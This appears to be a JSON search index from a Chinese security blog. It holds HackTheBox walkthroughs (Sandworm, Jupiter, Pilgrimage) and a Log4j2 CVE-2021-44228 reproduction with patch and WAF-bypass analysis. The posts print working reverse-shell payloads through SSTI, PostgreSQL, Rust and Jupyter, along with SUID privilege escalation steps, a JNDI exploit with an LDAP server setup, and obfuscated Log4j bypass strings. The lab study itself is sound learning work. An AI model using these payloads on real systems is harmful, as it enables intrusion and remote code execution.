{"meta":{"title":"wa0er","subtitle":"wa0er","description":"Love and Share","author":"wa0er","url":"https://wa0er.github.io","root":"/"},"pages":[{"title":"404","date":"2022-03-05T09:41:59.000Z","updated":"2022-03-06T14:24:31.930Z","comments":true,"path":"404.html","permalink":"https://wa0er.github.io/404.html","excerpt":"","text":""},{"title":"categories","date":"2022-03-04T14:03:51.000Z","updated":"2022-03-05T09:26:43.672Z","comments":true,"path":"categories/index.html","permalink":"https://wa0er.github.io/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2022-03-04T14:04:30.000Z","updated":"2022-03-05T09:18:33.720Z","comments":true,"path":"about/index.html","permalink":"https://wa0er.github.io/about/index.html","excerpt":"","text":""},{"title":"contact","date":"2022-03-05T09:18:55.000Z","updated":"2022-03-05T09:19:25.465Z","comments":true,"path":"contact/index.html","permalink":"https://wa0er.github.io/contact/index.html","excerpt":"","text":""},{"title":"friends","date":"2022-03-05T09:19:45.000Z","updated":"2022-03-05T09:20:13.247Z","comments":true,"path":"friends/index.html","permalink":"https://wa0er.github.io/friends/index.html","excerpt":"","text":""},{"title":"tags","date":"2022-03-04T14:03:06.000Z","updated":"2022-03-05T09:17:08.567Z","comments":true,"path":"tags/index.html","permalink":"https://wa0er.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"HTB-Sandworm","slug":"HTB24-Sandworm-Medium","date":"2023-10-28T11:00:00.000Z","updated":"2023-11-06T10:07:27.207Z","comments":true,"path":"posts/5f6105d4.html","link":"","permalink":"https://wa0er.github.io/posts/5f6105d4.html","excerpt":"","text":"HTB-Sandworm一、思路概要1.端口扫描发现域名，目录扫描发现PGP签名验证功能； 2.签名验证功能存在Flask模板注入； 3.Flask模板注入反弹shell获取atlas用户web权限； 4.配置文件信息泄露获取ssh账户silentobserver； 5.登录ssh账户，运行pspy64和linpeas发现计划任务和SUID文件； 6.Rust计划任务提权获取atlas在jailer组的shell权限； 7.firejail的SUID提权获取root权限。 二、信息收集nmap扫描端口服务 发现域名，写入本地hosts文件 echo \"10.10.11.218 ssa.htb\" &gt;&gt; /etc/hosts 浏览器访问，没什么有价值的东西 扫描目录 gobuster dir -u https://ssa.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,.html -t 50 -k 有几个非常规目录 /admin如下图 /guide如下图 有通过PGP公钥验证签名的功能，如下图 页面底部还有一段被签名的消息，如下图 /pgp如下图，是PGP公钥 那么可以把此处的公钥和/guide页面底部被签名的消息，填入到/guide页面验证签名功能对应的文本框中，点击验证签名后，弹出如下内容 与/guide页面底部的提示说明一致，说明签名验证成功，消息的机密性、可用性、完整性被保证 从/guide页面的版权标志处看出用的python Flask框架，此框架主要漏洞就是SSTI（Server Side Template Injection），此处PGP签名功能有交互，可以在此处用这个功能做测试 三、Flask SSTI（服务端模板注入）那么在本地kali上，用gpg生成公私钥对 gpg --gen-key #生成密钥对 Real name: {{100*100}} #测试模板注入，如果被执行，会显示10000 Email address: &lt;any_mail&gt;（邮箱随意，此处采用在/guide页面底部发现的atlas@ssa.htb） gpg --list-keys #列出所有公私钥对 将指定电子邮件地址（此处是atlas@ssa.htb）的公钥导出为文本格式，并将它保存到public_key.asc文件中 gpg --armor --export atlas@ssa.htb &gt; public_key.asc --armor: 这个选项指示 GnuPG 导出的密钥应该以文本格式（ASCII armored）导出，而不是二进制格式。ASCII armored 密钥更易于共享和传输，通常用于通过电子邮件或文本文件分享公钥。 创建一个名为message.txt的文本文件，其中包含消息test。使用 GnuPG 对message.txt文件中的消息test进行数字签名，并将带有数字签名的消息保存为 signed_message.asc。这个签名可以用于验证消息的完整性和来源，确保它没有被篡改，并由私钥持有者签名。 echo \"test\" &gt; message.txt gpg --clear-sign --output signed_message.asc message.txt --clear-sign: 这个选项告诉 GnuPG 对消息执行clear sign，这意味着数字签名将被添加到消息的末尾，并且消息内容本身保持可读性。 查看公钥public_key.asc和被签名的消息 signed_message.asc。 分别填入到/guide页面对应的文本框里，验证签名 发现弹出如下内容，其中包含有执行模板注入表达式的结果10000 确认存在模板注入，就可以尝试执行命令。先删除之前生成的密钥对 gpg --delete-secret-keys atlas@ssa.htb gpg --delete-keys atlas@ssa.htb 重新生成密钥对，在Real name填入如下内容 {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}} 然后按照之前的思路导出公钥和被签名的消息，重新验证，弹窗如下，命令id被成功执行 反弹shell如下 {{self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1\"').read()}} 生成密钥提示Real name不能有尖括号，那就把base64编码payload，如下 {{self.__init__.__globals__.__builtins__.__import__('os').popen('echo \"YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Lzk4OTggMD4mMSI=\" | base64 -d | bash').read()}} 然后按照之前的思路验证签名，开启监听，成功获取到atlas用户的shell权限 在home目录看到还有一个用户silentboserver 在如下文件找到用户silentboserver的口令 /home/atlas/.config/httpie/sessions/localhost_5000 username: silentobserver password: quietLiketheWind22 ssh连接 ssh silentobserver@10.10.11.218 四、Rust计划任务提权上传运行pspy64，可看到有计划任务会以atlas用户身份执行/opt/tipnet目录下的文件 上传linpeas，添加可执行权限，运行，发现如下文件存在SUID firejail可以suid提权，利用脚本：https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25 但是firejail文件的属组是jailer，linpeas结果可以看到atlas用户的属组是jailer，但是此时我们连接的是silentobserver用户的ssh账户 之前有个反弹得到的atlas用户的shell权限 用反弹shell的命令行窗口从本地kali获取脚本，提示命令未找到，那可能这个shell是web权限，比较低。有计划任务会以atlas用户身份执行/opt/tipnet目录，那么就可以尝试通过此计划任务来反弹一个shell 此时看另一个可疑的suid文件，在它的同级目录下发现如下内容 对于silentobserver用户，只有/opt/crates/logger/src/lib.rs有可写权限 参考：https://doc.rust-lang.org/std/process/struct.Command.html 在/opt/crates/logger/src/lib.rs添加如下Rust代码，尝试反弹shell use std::process::Command; let output = Command::new(\"bash\") .arg(\"-c\") .arg(\"bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1\") .output() .expect(\"failed to execute process\"); 开启监听，稍等片刻，成功反弹获得atlas用户jailer组的shell权限 ssh公钥伪造实现权限维持由于每次执行完此定时任务后，/opt/crates/logger/src/lib.rs会自动恢复成原来的样子。这样如果shell断了，想要重连，又要重新修改文件并等待反弹。另外在此处发现atlas的home目录下有.ssh目录，那么就可以尝试ssh公钥伪造登录。 本地kali生成rsa公钥和私钥，分别默认保存在/root/.ssh/id_rsa.pub和/root/.ssh/id_rsa ssh-keygen -t rsa #两次默认回车即可 开启http服务，把公钥id_rsa.pub传输到目标靶机/home/atlas/.ssh目录下，并重命名为authorized_keys wget http://10.10.14.7/id_rsa.pub -O authorized_keys 然后本地执行如下命令登录ssh ssh -i id_rsa atlas@10.10.11.218 五、firejail SUID提权上传firejail的利用脚本并执行 重开一个ssh窗口，执行如下命令 firejail --join=&lt;number&gt; su - 成功获取root权限 Over！","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Jupiter","slug":"HTB23-Jupiter-Medium","date":"2023-10-21T11:00:00.000Z","updated":"2023-11-06T10:07:04.230Z","comments":true,"path":"posts/d4f5920f.html","link":"","permalink":"https://wa0er.github.io/posts/d4f5920f.html","excerpt":"","text":"HTB-Jupiter一、思路概要1.信息收集发现子域，子域api存在PostgreSQL注入； 2.PostgreSQL注入反弹shell获取postgres用户权限； 3.查看/etc/passwd发现juno和jovian用户； 4.juno用户有定时任务文件并存在命令执行； 5.命令执行suid提权获取juno用户权限； 6.查看端口开放状态发现Jupyter服务； 7.ssh公钥伪造实现端口转发； 8.token泄露成功登录并通过Jupyter反弹shell获取jovian用户权限； 9.sudo -l发现任意文件读取获取root文件。 二、信息收集nmap扫描端口服务 80端口开放，有域名，写入本地hosts文件 echo \"10.10.11.216 jupiter.htb\" &gt;&gt; /etc/hosts 浏览器访问，首页如下图 扫描子域 gobuster vhost -u http://jupiter.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 发现子域kiosk.jupiter.htb，写入本地hosts文件 echo \"10.10.11.216 kiosk.jupiter.htb\" &gt;&gt; /etc/hosts 访问子域 由标签页标题判断出是Grafana框架，访问的同时Burp抓包看到如下api，其中有PostgresSQL语句执行 三、PostgreSQL注入反弹shell参考：https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#cve-20199193 存在注入（可用SELECT version()测试是否存在sql注入） 提前在本地kali开启监听，依次执行如下命令反弹shell DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c \\\"bash -i &gt;&amp; /dev/tcp/10.10.14.5/9898 0&gt;&amp;1\\\"'; 成功获取postgres用户权限 查看/etc/passwd，除root外还有两个用户：juno和jovian 四、定时任务命令执行suid提权查找属于用户 juno 的文件和目录（经尝试，jovian用户的文件postgres用户无可读权限） find / -user juno 2&gt;/dev/null 查看与众不同的文件 cat /dev/shm/network-simulation.yml 此处执行pspy64，对比执行结果，可看到下侧server和client的path和args会被当作命令执行 切换成交互式shell（方便编辑文件） python3 -c 'import pty;pty.spawn(\"/bin/bash\")' Ctrl+Z stty raw -echo; fg export TERM=xterm 修改vim /dev/shm/network-simulation.yml - path: /usr/bin/cp args: /bin/bash /tmp/bash - path: /usr/bin/chmod args: u+s /tmp/bash 稍等片刻，可看到/tmp/bash文件有了suid 执行如下命令提权，成功获取juno用户权限 /tmp/bash -p 进入juno用户home目录下查看 cd /home/juno ls la juno 用户没有user.txt读权限，但可看到有.ssh目录 五、ssh公钥伪造看到有认证密钥，可以伪造ssh密钥连接 本地用ssh-keygen生成ssh公私钥 传到靶机，并覆盖掉原来的密钥文件authorized_keys 如果本地kali不是root用户生成的密钥，需要用chmod 600 id_rsa给私钥添加权限 用如下命令通过私钥连接ssh ssh -i id_rsa juno@10.10.11.216 查看端口服务 本地kali开启ssh端口转发 ssh -i id_rsa -L 8888:127.0.0.1:8888 juno@10.10.11.216 然后浏览器访问localhost:8888，需要password或token登录 六、登录凭据泄露二次反弹shell之前说jovian用户的文件postgres用户无可读权限，此时我们看一下，有个目录/opt/solar-flares find / -user jovian 2&gt;/dev/null 在/opt/solar-flares/logs目录下有日志文件，随便打开一个看会有token 那么可用如下命令查看所有文件内的所有token cat * | grep “token” token很多，用最后一个，因为最后一个是最近登录的有效token，成功登录 打开flares.ipynb，点击上侧菜单栏File→New Notebook→Python3 (ipykernel) 新建一个脚本 写入反弹shell脚本 import os; os.system('bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.5/9898 0&gt;&amp;1\"') 本地kali开启监听，点击Run，成功获取jovian用户权限 七、任意文件读取获取root文件sudo -l查看可执行的命令 执行，提示没找到配置文件 用strings分析一下这个命令文件里可能有什么配置文件 strings /usr/local/bin/sattrack | grep -i config 看到有/tmp/config.json，但实际去找的时候却没有，于是用如下命令查找config.json find / -name config.json 2&gt;/dev/null 发现/usr/local/share/sattrack/config.json，猜测应该是执行命令的时候会从/tmp目录读取配置文件，那么我们将配置文件复制到/tmp/config.json cp /usr/local/share/sattrack/config.json /tmp/config.json 查看配置文件内容 再次执行命令，发现tmp目录下生成了一个tle目录，目录内是配置文件中tlesources的内容，猜测应该是从目标链接把文件下载到tle目录 那么我们修改配置文件tlesources为如下，直接读取root.txt file:///root/root.txt 再次执行，发现root.txt成功被读取出来，任意文件读取 sudo /usr/local/bin/sattrack Over！","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"Log4j2（CVE-2021-44228）漏洞复现及原理思考","slug":"Log4j2（CVE-2021-44228）漏洞复现及原理思考","date":"2023-10-21T04:00:00.000Z","updated":"2023-11-06T10:10:17.192Z","comments":true,"path":"posts/1e9a0fae.html","link":"","permalink":"https://wa0er.github.io/posts/1e9a0fae.html","excerpt":"","text":"Log4j2（CVE-2021-44228）漏洞复现及原理思考前言Log4j2是一个Java日志组件，被各类Java框架广泛地使用。它的前身是Log4j，Log4j2重新构建和设计了框架，可以认为两者是完全独立的两个日志组件。本次漏洞影响范围为Log4j2最早期的版本2.0-beta9到2.15.0。 因为存在前身Log4j，而且都是Apache下的项目，不管是jar包名称还是package名称，看起来都很相似，导致有些人分不清自己用的是Log4j还是Log4j2。这里给出几个辨别方法： Log4j2分为2个jar包，一个是接口log4j-api-${版本号}.jar，一个是具体实现log4j-core-${版本号}.jar。Log4j只有一个jar包log4j-${版本号}.jar。 Log4j2的版本号目前均为2.x。Log4j的版本号均为1.x。 Log4j2的package名称前缀为org.apache.logging.log4j。Log4j的package名称前缀为org.apache.log4j。 Log4j2的JNDI注入漏洞（CVE-2021-44228）可以称之为“核弹”级别。Log4j2作为类似jdk级别的基础类库，几乎无人幸免。 一、漏洞复现（一）服务端环境搭建开发环境：IDEA 2021.2、JDK 8 新建一个Spring项目，File→New→Project，配置如下 勾选Spring Web 如果第一次创建，需稍等片刻下载spring-boot相关依赖，IDEA右下角可查看相关依赖下载进度。 修改pom.xml文件 在log4j_demo\\src\\main\\java\\com\\example\\log4j_demo下创建HelloLog4j.java，内容如下 package com.example.log4j_demo; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; import org.springframework.web.bind.annotation.RequestBody; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestMethod; import org.springframework.web.bind.annotation.RestController; import java.util.Map; @RestController public class HelloLog4j { private Logger Logger = LogManager.getLogger(HelloLog4j.class); @RequestMapping(value = \"/login\" , method = {RequestMethod.POST}) public String login(@RequestBody Map body) { String user = body.get(\"user\").toString(); String password = body.get(\"password\").toString(); Logger.error(\"user:{}, password:{}\" , user ,password); return \"login\"; } } IDEA右上角选择Log4jDemoApplication→Edit Configurations，弹窗修改Environment→VM options -Dcom.sun.jndi.ldap.object.trustURLCodebase=true 然后需要检查几个地方 1. JDK版本相关可能出现的报错，参考：【Java异常】IDEA 报错：无效的目标发行版：17 pom.xml文件中的java.version属性需为8 File→Project Structure→Project，SDK版本如下 File→Project Structure→Modules，Language level如下 Settings→Java Compiler如下 2. SprinBoot版本相关可能出现的报错，参考：类文件具有错误的版本 61.0, 应为 52.0 pom.xml文件中spring-boot版本 因为Spring官方发布从Spring 6以及SprinBoot 3.0开始最低支持JDK 17，此处用的JDK 8，所以需将SpringBoot版本降低为3.0以下，笔者此处用2.7.8。 上面检查好后，右上角绿色小三角运行项目，控制台输出如下 浏览器访问：http://127.0.0.1:8080/login，错误页面是因为代码中只接收POST请求，不影响 （二）编写EXP新建一个Java项目，File→New→Project 然后直接Next→Next→起个项目名Exp→Finish 在src目录新建一个Exp.java，内容如下 import java.io.IOException; public class Exp { public Exp(){ try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException e) { e.printStackTrace(); } } public static void main(String[] args) { Exp exploit = new Exp(); } } 右键运行，可看到计算器被打开，且项目目录Exp\\out\\production\\Exp下生成了Exp.class 在此目录打开cmd，开一个http服务 然后利用反序列化工具marshalsec，开一个LDAP服务 下载：https://github.com/mbechler/marshalsec 参考：https://exploit-notes.hdks.org/exploit/web/log4j-pentesting/#exploit-apache-solr-(jndi) 下载marshalsec，进到主目录，用如下命令编译 mvn clean package -DskipTests 编译成功cmd窗口末尾会显示如下内容 然后开启LDAP服务 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:9898/#Exp\" 通过HackBar用POST请求发送json格式payload如下，执行后，会弹出系统计算机 { \"user\": \"wa0er\", \"password\": \"${jndi:ldap://127.0.0.1:1389/Exp}\" } 此时看LDAP和HTTP服务窗口如下，Exp.class被调用执行 复现成功！ 二、原理分析（一）JNDI注入参考：https://xz.aliyun.com/t/12277#toc-2、https://tttang.com/archive/1611/#toc_jndi JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。若程序定义了 JDNI 中的接口 API ，则就可以通过该接口 API 访问系统的 命令服务和目录服务，如下图。JNDI可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA。 JNDI 注入，即当开发者在定义 JNDI 接口初始化时，lookup() 方法的参数可控，攻击者就可以将恶意的 url 传入参数远程加载恶意payload，造成注入攻击。 （二）调试分析由于是JNDI注入，因此可以在InitialContext.lookup(String name)方法下断点（也可以在创建的HelloLog4j.java的Logger.error()处下断点一步一步调试过来，但初次分析依然建议在InitialContext下断点，因为调用链较复杂，涉及循环、分支，且中间有一部分与此漏洞的产生关系不大） 有几个关键点 Logger.error ...... MessagePatternConverter.format .... StrSubstitutor.resolveVariable Interpolator.lookup JndiLookup.lookup JndiManager.lookup InitialContext.lookup 1. Logger.error()从Logger.error()处进来 在进行Logger.error()日志记录时会采用logIfEnabled()方法进行判断，isEnabled()返回为true才可以继续进行日志操作。这里也是漏洞能否成功触发的关键。 在本次漏洞分析过程中日志等级level为ERROR，它的intLevel()为200，而本环境中默认的日志级别this.intLevel为200（ERROR），正好满足this.intLevel &gt;= level.intLevel()。 此时filter()方法返回true，即isEnabled()返回为true，成功进入到logMessage()方法中。log4j默认的日志级别定义如下图，从上到下级别逐渐降低，intLevel()数值逐渐增大，分别是：OFF(0)、FATAL(100)、ERROR(200)、WARN(300)、INFO(400)、DEBUG(500)、TRACE(600)、ALL(2147483647)。由此可见，漏洞能否成功触发与设置的日志Level有关，需要不低于默认日志级别。 然后中间就是读取配置文件创建event事件等操作，一直到MessagePatternConverter.format()。 2. MessagePatternConverter.format()该方法对日志内容进行解析和格式化，并返回最终格式化后的日志内容。当碰到日志内容中包含${子串时，调用StrSubstitutor进行进一步解析。 3. StrSubstitutor.resolveVariable()StrSubstitutor将${和}之间的内容提取出来，调用并传递给Interpolator.lookup()方法，实现Lookup功能。 其中，StrSubstitutor.substitute()会经过如下for循环，匹配:-子串，这里就为后面的waf绕过提供了思路。 4. Interpolator.lookup()Interpolator实际是一个实现Lookup功能的代理类，该类在成员变量strLookupMap中（**本环境是lookups**）保存着各类Lookup功能的真正实现类。Interpolator对上一步提取出的内容解析后，从strLookupMap获得Lookup功能实现类，并调用实现类的lookup()方法。 例如对本例子中的jndi:ldap://127.0.0.1:1389/Exp解析后得到jndi的Lookup功能实现类为JndiLookup，并调用JndiLookup.lookup()方法。 5. JndiLookup.lookup()JndiLookup.lookup()方法调用JndiManager.lookup()方法处理jndi对象。 6. JndiManager.lookup()JndiManager.lookup()直接委托给InitialContext.lookup()方法。这里单独提到该方法，是因为后续的补丁中较为重要的变更即为该方法。 至此，后续即可按照常规jndi注入路径进行分析。 三、补丁分析（一）2.15.0-rc1通过比较2.15.0-rc1和该版本之前最后一个版本2.14.1之间的差异，可以发现Log4j2团队在12月5日提交了一个名为Restrict LDAP access via JNDI (#608)的commit。该commit的详细内容如下链接： https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3 除去一些测试代码和辅助代码，该commit最主要内容是在 JndiManager.lookup()方法增加了几种限制，分别是allowedHosts、allowedClasses、allowedProtocols。 由于rc1未在maven中央仓库上，因此需要自行下载代码并构建： 到Log4j2的GitHub官方仓库下载rc1：https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1。分别进入log4j-api和log4j-core目录，执行`mvn clean install -DskipTests`。最终会在本地maven仓库上生成rc1的jar包，版本为2.15.0，后续测试使用该jar包。 说明：此处笔者尝试构建时，maven的国内镜像（阿里云、腾讯云、华为云、网易云）均无法解析2.15.0的jar包 以下图片参考：https://www.freebuf.com/vuls/316143.html 各个限制的内容分别如下： 可以看到，rc1补丁通过对JNDI Lookup增加白名单的方式，限制默认可以访问的主机为本地IP，限制默认支持的协议类型为java、ldap、ldaps，限制LDAP协议默认可以使用的Java类型为少数基础类型，从而大大减少了默认的攻击面。 （二）2.15.0-rc21. rc1中存在的问题rc1里主要修复的JndiManager.lookup()方法的整体逻辑结构如下： public synchronized &lt;T&gt; T lookup(final String name) throws NamingException { try { URI uri = new URI(name); if (uri.getScheme() != null) { if (!allowedProtocols.contains(uri.getScheme().toLowerCase(Locale.ROOT))) { ...... return null; } if (LDAP.equalsIgnoreCase(uri.getScheme()) || LDAPS.equalsIgnoreCase(uri.getScheme())) { if (!allowedHosts.contains(uri.getHost())) { ...... return null; } ...... if (!allowedClasses.contains(className)) { ...... return null; } ...... } } } catch (URISyntaxException ex) { // This is OK. } return (T) this.context.lookup(name); } 从上面的代码结构中可以总结如下的逻辑： 对传入的name参数进行前面提到的三类白名单检查。如果检查不通过，则直接返回null。 如果产生URISyntaxException，则对该异常忽略，继续执行this.context.lookup(name)。 如果未产生URISyntaxException，则执行this.context.lookup(name)。 重点关注catch代码块，rc1默认不对URISyntaxException异常做任何处理，继续执行后续逻辑，即this.context.lookup(name)。 再看下try代码块中可能产生URISyntaxException的地方。好巧不巧，try代码块的第一个语句就可能产生该异常：URI uri = new URI(name);。 试想一下，如果能构造某个特殊的URI，导致URI uri = new URI(name);语句解析URI异常，抛出URISyntaxException，但又能被this.context.lookup(name)正确处理，不就可以绕过了吗？例如构建一个带空格的URI地址（${jndi:ldap://127.0.0.1:1389/ Exp}，由于撰写本文时无法构建rc1代码，故可参考https://www.freebuf.com/vuls/316143.html） 2. rc2的修复方案通过比较2.15.0-rc1和2.15.0-rc2之间的差异，可以发现Log4j2团队在12月10日提交了一个名为Handle URI exception的commit。该commit的详细内容如下链接： https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658 该commit主要内容是对rc1中JndiManager.lookup()方法里的catch代码块进行了修改：当URISyntaxException异常被捕获时，直接返回null。从而避免了上面提到的绕过思路。 四、WAF绕过各大厂商针对log4j2漏洞应急方案集合：https://mp.weixin.qq.com/s/ZbzLc_N26lgUfvS-mM4R2g 由于Log4j2框架几乎是一个类似JDK级别的基础类库，即便自身应用程序里完成了升级，但大量存在依赖引入的其它框架、中间件导致升级工作极为困难，甚至在几年内都无法达到一个可接受的水平。目前，绝大部分公司采取在边界防护设备上使用“临时补丁”的方式。同时，大量bypass方法也随之而来，这将是一个漫长的过程。 WAF主要思路是过滤jndi、ldap、rmi等关键字；过滤ip:port 原始payload ${jndi:ldap://malicious-ldap-server.com/Exp} （一）绕过思路1前面分析提到过，StrSubstitutor首先会匹配${，然后还会匹配:- 以${${::-j}ndi:${::-l}dap://127.0.0.1:1389/Exp}为例 如果找到:-，就截取:-之前的变量赋值给varName，截取:-到末尾的字符串赋值为varDefaultValve，然后就跳出循环。 然后使用resolveVariable() 对varName的内容进行判断，如果不匹配任何log4j2支持的协议，就返回null（这里varName的值为:）。之后就会把varDefaultValve的值（这里为j）赋给varValue。然后再用varValue替换整个${::-j}，即最后结果为jndi:ldap://127.0.0.1:1389/Exp。 所以绕过的方法可以是： ${任意字符串:-实际想要的字符串} = 实际想要的字符串 ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:1389/Exp} 注意：这里的任意字符串不能为log4j2支持的Interpolator前缀。 （二）绕过思路2Interpolator除jndi外，还支持解析很多其它前缀，如env、lower、upper，所以可以用如下思路来处理关键字（部分版本不支持lower、upper等协议）： ${jndi:${lower:l}${lower:d}a${lower:p}://127.0.0.1:1389/Exp} （三）绕过思路3针对过滤ip:port，可用域名代替或用默认端口开启ldap服务 ${jndi:ldap://malicious-ldap-server.com/Exp} ${jndi:ldap://malicious-ip/Exp} #此时需要ldap服务端口为389 五、思考Log4j2漏洞就其自身原理来说，并不复杂，本质上就是jndi注入，分析过程也主要聚焦于jndi注入的产生过程。rc1中采用较为严格的白名单策略，从应急处理的角度看无可厚非。但从历史上发生的各类漏洞修补过程来看，必定会有各种地方遗漏导致后续不断地打补丁。对于WAF的绕过，纵观古今漏洞，往往能在漏洞产生路线的周围找到绕过思路，就像高速公路一样，总会有“事故多发路段”。从软件开发角度讲，与其在上线后不停修复打补丁，不如在开发早期，即设计阶段或者开发阶段，尽量避免这类有可能产生安全风险的设计。在2.16.0版本，Log4j2团队干脆默认禁用掉了JNDI Lookup功能。 另外，rc1中catch代码对异常的处理方式，在日常开发过程中也是容易犯的问题。软件开发中有一个安全原则：Fail Securely，意思是业务系统能够正确安全地处理各种异常和错误。虽然业务开发有时会为了便利性而牺牲一部分安全性，但对于Log4j此类偏底层的强依赖性类库，还是需要严格处理各种可能出现的错误和异常。 阿里云工程师发现Apache Log4j2组件漏洞后，按业界惯例向软件开发方Apache开源社区报告这一问题。但最终工信部网络安全管理局决定暂停阿里云作为上述合作单位6个月。对此，笔者想引用艾公的一句话作为结尾：尊严只在剑锋之上，真理只在大炮射程之内。 参考记录一次log4j复现之旅（复现不了你来找我）：https://blog.csdn.net/lmboss/article/details/123927020 Log4j2的JNDI注入漏洞（CVE-2021-44228）原理分析与思考：https://www.freebuf.com/vuls/316143.html Apache Log4j2 Jndi RCE 高危漏洞分析与防御：https://paper.seebug.org/1787/ Log4j2 利用链与Waf绕过分析 Apache log4j2 远程命令执行漏洞复现：https://cloud.tencent.com/developer/article/2148989 log4j waf 绕过技巧：https://www.cnblogs.com/ph4nt0mer/p/15701647.html","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://wa0er.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"细读经典","slug":"漏洞复现/细读经典","permalink":"https://wa0er.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BB%86%E8%AF%BB%E7%BB%8F%E5%85%B8/"}],"tags":[{"name":"细读经典","slug":"细读经典","permalink":"https://wa0er.github.io/tags/%E7%BB%86%E8%AF%BB%E7%BB%8F%E5%85%B8/"},{"name":"Log4j2","slug":"Log4j2","permalink":"https://wa0er.github.io/tags/Log4j2/"},{"name":"JNDI注入","slug":"JNDI注入","permalink":"https://wa0er.github.io/tags/JNDI%E6%B3%A8%E5%85%A5/"}],"author":"wa0er"},{"title":"HTB-Pilgrimage","slug":"HTB22-Pilgrimage-Easy","date":"2023-10-14T11:00:00.000Z","updated":"2023-11-06T10:05:49.379Z","comments":true,"path":"posts/3e4c0ff8.html","link":"","permalink":"https://wa0er.github.io/posts/3e4c0ff8.html","excerpt":"","text":"HTB-Pilgrimage一、思路概要1.nmap端口扫描发现git源码泄露； 2.读源码发现压缩图片用的magick命令，且发现数据库文件绝对路径； 3.ImageMagick LFI读取ssh账户用户名口令； 4.运行pspy64发现有监视任务； 5.binwalk RCE提权获取root权限。 二、信息收集nmap扫描端口服务 80端口开放，有域名，写入本地hosts文件 echo \"10.10.11.219 pilgrimage.htb\" &gt;&gt; /etc/hosts 浏览器访问 主页是一个压缩图片的功能，上传文件，点击Shrink，成功后会返回图片链接 nmap扫描结果看到有git仓库 用git-dumper把git仓库下载下来：https://github.com/arthaud/git-dumper python3 git_dumper.py http://pilgrimage.htb/.git/ ./pilgrimage/git 主要代码如下 在index.php看到会执行/var/www/pilgrimage.htb/magick，还有sqlite数据库文件/var/db/pilgrimage 三、ImageMagick LFI（CVE-2022-44268）google关键字：ImageMagick poc https://github.com/Sybil-Scan/imagemagick-lfi-poc 用脚本生成恶意图片 python3 generate.py -f \"/etc/passwd\" -o exploit.png 在网站首页上传，然后用返回的链接下载 wget http://pilgrimage.htb/shrunk/6520f1b11b130.png 再用如下命令查看图片详细信息 identify -verbose 6520f1b11b130.png 图片的部分十六进制编码如下 十六进制解码：https://gchq.github.io/CyberChef/ 可看到读取到的/etc/passwd内容，其中有一个非常规用户emily 刚才在index.php看到的sqlite数据库文件/var/db/pilgrimage，同样用上述方法读取 python3 generate.py -f \"/var/db/pilgrimage\" -o exploit.png 部分关键编码如下 看到有emily用户的用户名口令 emily abigchonkyboi123 ssh连接 ssh emily@10.10.11.219 四、binwalk RCE提权连上ssh后，在靶机运行pspy64，看到有/usr/sbin/malwarescan.sh脚本，另外 解释命令：/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ -m：进入监视模式（monitor mode）； -e create：监视文件的创建事件； 当 /var/www/pilgrimage.htb/shrunk/ 目录中有新文件被创建时，将显示相关信息。 查看/usr/sbin/malwarescan.sh，会把/var/www/pilgrimage.htb/shrunk/ 目录新创建的文件用binwalk处理，那么就尝试看binwalk有没有可利用点 查看binwalk版本 google发现对应版本binwalk存在RCE https://www.exploit-db.com/exploits/51249 随便找一张图片wa0er.png作为输入，执行脚本 python3 exploit.py wa0er.png 10.10.14.5 9898 本地kali执行如下命令 nc -lvnp 9898 #开启监听 python3 -m http.server 80 #开启http服务 靶机执行如下命令 cd /var/www/pilgrimage.htb/shrunk/ wget http://10.10.14.5/binwalk_exploit.png 成功反弹shell，获取root权限 